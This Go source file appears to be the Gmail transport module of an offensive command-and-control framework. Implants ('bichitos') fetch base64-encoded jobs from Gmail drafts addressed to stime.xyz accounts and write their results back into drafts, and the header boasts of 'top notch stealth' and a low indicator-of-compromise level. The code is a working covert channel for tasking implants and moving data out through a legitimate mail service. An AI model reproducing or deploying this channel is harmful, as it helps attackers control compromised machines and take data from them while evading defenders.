// +build gmailgo
//// Listening Network Module for Redirectors ///////////////////////////////////////////////////////////
//
//   Network Method: Gmail APi is used. Draft mimic bichitos.
//
//   Warnings:       The top notch stealth                   
//                   
//   Fingenprint:    GO-LANG Client TLS Fingerprint
//
//   IOC Level:      Low
//   
//
///////////////////////////////////////////////////////////////////////////////////////////////////////


package network

import (

    "encoding/json"
    "strings"
    "encoding/base64"
    //"fmt"
    "os"
    "bytes"
    "golang.org/x/net/context"
    "golang.org/x/oauth2"
    "golang.org/x/oauth2/google"
    "google.golang.org/api/gmail/v1"
)

/*
JSON Structures for Compiling Redirectors Network Module parameters
Hive will have the same definitions in: ./src/hive/hiveImplants.go
*/
type Gmail struct {
    Name string   `json:"name"`    
    Creds string   `json:"creds"`
    Token string   `json:"token"`
}

type Reds struct {
    Redirectors []string   `json:"redirectors"`
}

type Job struct {
    Cid  string   `json:"cid"`              // The client CID triggered the job
    Jid  string   `json:"jid"`              // The Job Id (J-<ID>), useful to avoid replaying attacks
    Pid string   `json:"pid"`               // Parent Id, when the job came completed from a Implant, Pid is the Redirector where it cames from
    Chid string `json:"chid"`               // Implant Id
    Job string   `json:"job"`               // Job Name
    Time  string   `json:"time"`            // Time of creation
    Status  string   `json:"status"`        // Sent - Processing - Finished
    Result  string   `json:"result"`        // Job output data
    Parameters string   `json:"parameters"` // Parameters will be JSON serialized to provide flexibility
}

type BiAuth struct {
    Bid string   `json:"bid"`
    Token string  `json:"token"`  
}

/*
Description: gmailgo,Prepare Redirector Slice
Flow:
A.JSON Decode redirector data, for gmail modules, connected app refresh token/creds are needed (redirectors are basically gmail accounts)
B.Loop over each redirector and craft a working gmail account to connect to
*/
func PrepareNetworkMocule(jsonstring string) []string{

    var reds *Reds
    errD := json.Unmarshal([]byte(jsonstring),&reds)

    if errD != nil{
        os.Exit(1)
    }

	return reds.Redirectors
}

/*
Description: gmailgo, Retrieve Jobs from gmail draft mails that come from Hive
Flow:
A.Provided redirector (gmail creds) and auth JSON, retrieve BID
B.Retrieve gmail credentials from JSON, create a oauth google client and request access token
C.With the access token, list the draft and check if a mail draft thread exist with actual BID, if no create it
D.If a draft with BID subject exists, check if has redirector data "to:bichito@stime.xyz" and subject this BID
E.If exists, retireve body ,decode it and return (these are the jobs that come from hive to be processed)
*/
func RetrieveJobs(redirector string,authentication string) ([]byte,string){

    var result []byte

    //Get Bid
    var biauth *BiAuth
    //Decode auth bearer
    decoder := json.NewDecoder(bytes.NewBufferString(authentication))
    err := decoder.Decode(&biauth)

    if err != nil{
        return result,"Bichito Authentication Json Decoding Error"+err.Error()
    }

    bid := biauth.Bid

	

	//Decode Module Parameters, create listener socket
	var moduleParams *Gmail
	errDaws := json.Unmarshal([]byte(redirector),&moduleParams)
    if errDaws != nil {
        //ErrorLog
        return result,"Network(Listener JSON decoding error)"+errDaws.Error()
    }

    //Auth
    config, err := google.ConfigFromJSON([]byte(moduleParams.Creds), gmail.MailGoogleComScope)
    if err != nil {
        return result,"Unable to parse client secret file to config:" +err.Error()
    }
        
    tok := &oauth2.Token{}
    err = json.NewDecoder(strings.NewReader(moduleParams.Token)).Decode(tok)
    c := config.Client(context.Background(), tok)
       
    srv, err := gmail.New(c)
    if err != nil {
        return result,"Unable to retrieve Gmail client:"+ err.Error()
    }
    //

    //var messagesIds []string    
    user := "me"
    r, err := srv.Users.Drafts.List(user).Do()
    if err != nil {
        return result,"Draft List Getting Error: "+err.Error()
    }


    var existBid bool = false
    for _,l := range r.Drafts{
        r2, err2 := srv.Users.Messages.Get(user,l.Message.Id).Do()
            if err2 != nil {
                existBid = true
                continue
            }


        if (r2.Payload.Headers[2].Value == bid) {existBid = true}
        if (r2.Payload.Headers[1].Value == "bichito@stime.xyz") && (r2.Payload.Headers[2].Value == bid){

            //Get Body with Jobs JSON data and sent it to Hive Queue
            result, err = base64.StdEncoding.DecodeString(r2.Payload.Body.Data)
            if err != nil {
                return result,err.Error()
            }

            return result,"Success"
               
        }

    }

    //When Swapping to new SaaS, create the Gmai Draft
    if !existBid {
        ping := &Job{"","","",bid,"BiPing","","","",""}
    
        var jobsChecking = []*Job{ping}
        bufRC := new(bytes.Buffer)
        json.NewEncoder(bufRC).Encode(jobsChecking)
        resultRP := bufRC.String()

        err := Checking(redirector,authentication,bid,[]byte(resultRP))
        if err != ""{
            return result,err
        }
    }
    
    return result,"No redirector answer in respTime"
}

/*
Description: gmailgo,Send Jobs through gmail draft mails to Hive
Flow:
A.Provided redirector (gmail creds) and auth JSON, retrieve BID
B.Retrieve gmail credentials from JSON, create a oauth google client and request access token
C.With the access token, list the draft and check if a mail draft thread exist with actual BID, if no create it
D.Select the draft which subject has BID and write the Job payload in the body
*/
func SendJobs(redirector string,authentication string,encodedJob []byte) string{

    //Get Bid
    var biauth *BiAuth
    //Decode auth bearer
    decoder := json.NewDecoder(bytes.NewBufferString(authentication))
    err := decoder.Decode(&biauth)

    if err != nil{
        return "Bichito Authentication Json Decoding Error"+err.Error()
    }

    bid := biauth.Bid

	//Decode Module Parameters, create listener socket
	var moduleParams *Gmail
	errDaws := json.Unmarshal([]byte(redirector),&moduleParams)
    if errDaws != nil {
        //ErrorLog
        return "Network(Listener JSON decoding error)"+errDaws.Error()
    }

    //Auth
    config, err := google.ConfigFromJSON([]byte(moduleParams.Creds), gmail.MailGoogleComScope)
    if err != nil {
        return "Unable to parse client secret file to config:" +err.Error()
    }
        
    tok := &oauth2.Token{}
    err = json.NewDecoder(strings.NewReader(moduleParams.Token)).Decode(tok)
    c := config.Client(context.Background(), tok)
       
    srv, err := gmail.New(c)
    if err != nil {
        return "Unable to retrieve Gmail client:"+ err.Error()
    }


    user := "me"
    r, err := srv.Users.Drafts.List(user).Do()
    if err != nil {
        return "Draft List Getting Error: "+err.Error()
    }


    for _,l := range r.Drafts{
        r2, err2 := srv.Users.Messages.Get(user,l.Message.Id).Do()
        if err2 != nil {
                continue
        }
        if (r2.Payload.Headers[2].Value == bid){
            rawDraft := "To: redirector@stime.xyz\r\nSubject:"+bid+"\r\n\r\n"+string(encodedJob)
            rawDraftFormatted := base64.RawURLEncoding.EncodeToString([]byte(rawDraft))
            rawDraftFormatted = strings.Replace(rawDraftFormatted,"+","-",-1)
            rawDraftFormatted = strings.Replace(rawDraftFormatted,"/","_",-1)
            rawDraftFormatted = strings.Replace(rawDraftFormatted,"=","",-1)
            message := &gmail.Message{Raw:rawDraftFormatted}
            draft := &gmail.Draft{Message:message}
       
            _, err = srv.Users.Drafts.Update(user,l.Id,draft).Do()
            if err != nil {
                //Debug:
                //fmt.Println(err.Error())
                return err.Error()
            }

            return "Success"
        }
    }

	return "No active Bid"
}

/*
Description: gmailgo,Checking Bichito
Flow:
A.Provided redirector (gmail creds) and auth JSON, retrieve BID
B.Retrieve gmail credentials from JSON, create a oauth google client and request access token
C.Create the mail draft thread with BID so can be use in the egression. Redirector will see this mail and check Bichito within Hive
*/
func Checking(redirector string,authentication string,bidP string,encodedJob []byte) string{

	//Decode Module Parameters, create listener socket
	var moduleParams *Gmail
	errDaws := json.Unmarshal([]byte(redirector),&moduleParams)
    if errDaws != nil {
        //ErrorLog
        return "Network(Listener JSON decoding error)"+errDaws.Error()
    }

    //Auth
    config, err := google.ConfigFromJSON([]byte(moduleParams.Creds), gmail.MailGoogleComScope)
    if err != nil {
        return "Unable to parse client secret file to config:" +err.Error()
    }
        
    tok := &oauth2.Token{}
    err = json.NewDecoder(strings.NewReader(moduleParams.Token)).Decode(tok)
    c := config.Client(context.Background(), tok)
       
    srv, err := gmail.New(c)
    if err != nil {
        return "Unable to retrieve Gmail client:"+ err.Error()
    }

    
    rawDraft := "To: redirector@stime.xyz\r\nSubject:"+bidP+"\r\n\r\n"+string(encodedJob)
    rawDraftFormatted := base64.RawURLEncoding.EncodeToString([]byte(rawDraft))
    rawDraftFormatted = strings.Replace(rawDraftFormatted,"+","-",-1)
    rawDraftFormatted = strings.Replace(rawDraftFormatted,"/","_",-1)
    rawDraftFormatted = strings.Replace(rawDraftFormatted,"=","",-1)
    message := &gmail.Message{Raw:rawDraftFormatted}
    user := "me"

    draft := &gmail.Draft{Message:message}
       
    _, err = srv.Users.Drafts.Create(user,draft).Do()
    if err != nil {
        return "Creating new Draft Error: "+err.Error()
    }


	return ""
}


